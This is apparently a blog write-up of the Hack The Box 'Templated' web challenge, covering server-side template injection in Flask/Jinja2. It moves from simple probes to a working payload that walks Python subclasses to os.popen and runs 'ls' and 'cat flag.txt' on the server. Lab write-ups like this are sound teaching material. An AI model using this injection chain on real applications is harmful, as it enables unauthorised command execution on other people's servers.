---
layout: post
title: "[HTB] Templated Writeup"
slug: "templated"
date: "2023-01-14"
comments: false
categories:
  - hacking
tags:
  - ctf
  - write up
  - hack the box
  - ssti
---

This is my writeup for Hackthebox [Templated](https://app.hackthebox.com/challenges/templated) Web Challenge. The challenge is fairly straight forward and is an easier challenge.

## Initial Analysis

Visiting the ip address provided, we are greeted with ```site still under construction``` page with powered by ```Flask/Jinja2``` text at the bottom.

![site still under](/images/templated/templated1.png)

*img: Site still under construction.*

Upon investigation we discover that ```Flask``` is a python web framework while ```Jinja2``` is the templating engine utilised. Since the name of the challenge also includes ```template```d we can be fairly certain that it has to do something with ```Server Side Template Injection```.

> Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. [PortSwigger.net](https://portswigger.net/web-security/server-side-template-injection#:~:text=What%20is%20server%2Dside%20template,fixed%20templates%20with%20volatile%20data.)

SSTI basically allows us to exploit the templating engine to execute code and other payloads. 

## Testing

Let us test the url by injecting a plain text in the address bar of the browser.

![text](/images/templated/templated2.png)

img: Text displayed on the screen.

Now injecting a SSTI payload in the address.
```python
{{1+1}}
```
![text](/images/templated/templated3.png)

*img: Value of 2 displayed.*

```python
{{"hello".upper()}}
```

Let us try another python string method.

![text](/images/templated/templated4.png)

*img: String hello is capitalised.*

```python
{{"hello".upper()}}
```

Our goal is to exploit the template engine so that we can import the ```os``` library and make system calls on the servers. 
Here is a really good [resource](https://secure-cookie.io/attacks/ssti/) on how to achieve this by leveraging python classes and modules.


Using this code below, we look at the base class of the string and then list the subclasses derived from the base class.
```python
{{"hello".__class__.__base__.__subclasses__()}}
```

![text](/images/templated/templated5.png)

*img: executing python code. 

We parse through the subclasses listed in the above image and find the <class 'warnings.catch_warnings'>. This subclass allows us to import the sys module and then later the os module. We can use some comma separated element parser to find the location of the ```warnings```(it is 186 in our case) class and then write our exploit as below:

```python
{{"hello".__class__.__base__.__subclasses__()[186].__init__.__globals__['sys'].modules['os'].popen("ls").read()}}n
```

![text](/images/templated/templated6.png)

*img: We get the files listed by using the ls command. 

Since we can see that there is a flag.txt present in the directory. We can just execute ```cat flag.txt``` to get the flag.

```python
{{"hello".__class__.__base__.__subclasses__()[186].__init__.__globals__['sys'].modules['os'].popen("cat flag.txt").read()}}n

```
> The flag is HTB{t***************************************!}







